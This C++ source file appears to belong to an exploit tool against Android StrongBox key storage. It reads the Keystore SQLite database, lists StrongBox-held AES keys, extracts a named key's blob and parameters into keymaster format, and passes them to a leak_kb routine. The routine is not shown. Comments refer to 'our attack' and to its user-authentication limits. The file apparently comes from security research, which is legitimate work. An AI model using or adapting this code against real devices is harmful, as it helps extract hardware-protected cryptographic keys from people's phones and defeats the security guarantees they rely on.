#include "keyblob_utils.h"

#include <sqlite3.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <utils.h>

#include <map>
#include <sstream>

#include "nugget/app/keymaster/keymaster_defs.pb.h"
#include "utils.h"

using namespace std;
using namespace ::nugget::app;

KeyblobUtils::KeyblobUtils(const char *db_name) {
  sqlite3_open(db_name, &db);

  if (db == NULL) {
    cerr << "Failed to open DB" << endl;
    exit(1);
  }
}

KeyblobUtils::KeyblobUtils() : KeyblobUtils(KEYSTOREDB_PATH) {}

KeyblobUtils::~KeyblobUtils() { sqlite3_close(db); }

// Return size in bits
int64_t KeyblobUtils::getKeySizeFromDB(int64_t keyid) {
  int64_t size;
  sqlite3_stmt *stmt;

  std::string query = "select data from keyparameter where keyentryid == ? and tag == ?;";

  sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL);
  sqlite3_bind_int64(stmt, 1, (sqlite3_int64) keyid);
  sqlite3_bind_int64(stmt, 2, (sqlite3_int64) static_cast<int64_t>(::keymint::Tag::KEY_SIZE));

  if (sqlite3_step(stmt) == SQLITE_DONE) {
    cerr << "No such data" << endl;
    return -1;
  }

  size = sqlite3_value_int64(sqlite3_column_value(stmt, 0));

  sqlite3_finalize(stmt);

  return size;
}

void KeyblobUtils::addParam(keymaster::KeyParameters *params,
                            ::keymaster::Tag tag, int64_t data) {
  ::keymaster::KeyParameter *param = params->add_params();
  param->set_tag(tag);
  param->set_integer(data);
}

void KeyblobUtils::fillKeymasterParam(keymaster::KeyParameters *params,
                                      int64_t keymintTag, int64_t data) {
  const std::pair<::keymaster::Tag, std::map<int64_t, int64_t>> &p =
      keyparameters_map.at(keymintTag);

  if (p.second.empty()) {
    addParam(params, p.first, data);
  } else if (p.second.count(data)) {
    addParam(params, p.first, p.second.at(data));
  } else
    cout << "Unused data " << data << " : " << p.second.count(data) << " for "
         << keymintTag << endl;
}

/*
 * Get key info and return them in keymaster format
 */
int KeyblobUtils::getKeyParametersFromDB(int64_t keyid,
                                         ::keymaster::KeyParameters *params) {
  sqlite3_stmt *stmt;
  std::string query = "select data from keyparameter where keyentryid == ? and tag == ?;";

  // TODO: make sure that the key does not require user authentication
  // Since our attack won't work if it is the case
  for (auto const &[keymintTag, val] : keyparameters_map) {
    sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL);
    sqlite3_bind_int64(stmt, 1, (sqlite3_int64) keyid);
    sqlite3_bind_int64(stmt, 2, (sqlite3_int64) keymintTag);

    // Only keep one parameter per type
    if (sqlite3_step(stmt) != SQLITE_DONE)
      fillKeymasterParam(params, keymintTag,
                         sqlite3_value_int64(sqlite3_column_value(
                             stmt, 0)));

    sqlite3_reset(stmt);
  }

  return 0;
}

/*
 * Get keyblob and return it in keymaster format
 */
::keymaster::KeyBlob *KeyblobUtils::getKeyblobFromDB(int64_t keyid) {
  sqlite3_stmt *stmt;

  std::ostringstream db_request;
  int64_t blobsize = 0;
  keymaster::KeyBlob *kb = new keymaster::KeyBlob();

  // get blob
  std::string query = "select blob from blobentry where keyentryid == ?;";

  sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL);
  sqlite3_bind_int64(stmt, 1, (sqlite3_int64) keyid);

  if (sqlite3_step(stmt) == SQLITE_DONE) cerr << "No keyblob" << endl;

  blobsize = sqlite3_column_bytes(stmt, 0);
  uint8_t *buf = (uint8_t *)sqlite3_column_blob(stmt, 0);

  kb->set_blob((void *)(buf + 8),
               (size_t)blobsize - 8);  // hack:: skip the first 8 bytes

  sqlite3_finalize(stmt);

  return kb;
}

/*
 * Leak strongbox key by name
 */
int KeyblobUtils::leakStrongboxKey(string name) {
  sqlite3_stmt *stmt;

  nugget::app::keymaster::KeyParameters *params;

  std::string query = "select id from keyentry INNER JOIN (select distinct keyentryid from "
         "keyparameter where security_level=2 and tag == 268435458 and data == "
         "32) StrongboxID on StrongboxID.keyentryid == id where alias == ?;";

  // TODO: make sure that the key does not require user authentication
  sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL);
  sqlite3_bind_text(stmt, 1, name.c_str(), name.length(), SQLITE_STATIC);


  if (sqlite3_step(stmt) == SQLITE_DONE) {
    cerr << "No strongbox key named " << name << " found" << endl;
    return -1;
  }

  params = new nugget::app::keymaster::KeyParameters();
  int64_t id = sqlite3_value_int64(sqlite3_column_value(stmt, 0));

  getKeyParametersFromDB(id, params);

  keymaster::KeyBlob *kb = getKeyblobFromDB(id);
  leak_kb(kb, params, getKeySizeFromDB(id) / 8);  // takes the size in bytes

  sqlite3_finalize(stmt);

  return 0;
}

/*
 * List all strongbox keys
 */
int KeyblobUtils::listStrongboxKeys() {
  sqlite3_stmt *stmt;

  // TODO: make sure that the key does not require user authentication
  sqlite3_prepare_v2(
      db,
      "select id, alias from keyentry INNER JOIN (select distinct keyentryid "
      "from keyparameter where security_level=2 and tag == 268435458 and data "
      "== 32) StrongboxID on "  // only select AES keys store id in strongbox
      "StrongboxID.keyentryid == id;",
      -1, &stmt, NULL);

  while (sqlite3_step(stmt) != SQLITE_DONE) {
    int64_t id = sqlite3_value_int64(sqlite3_column_value(stmt, 0));

    cout << "- Key name: " << sqlite3_column_text(stmt, 1)
         << " (size: " << getKeySizeFromDB(id) << ")"
         << endl;  // takes the size in bytes
  }

  sqlite3_finalize(stmt);

  return 0;
}
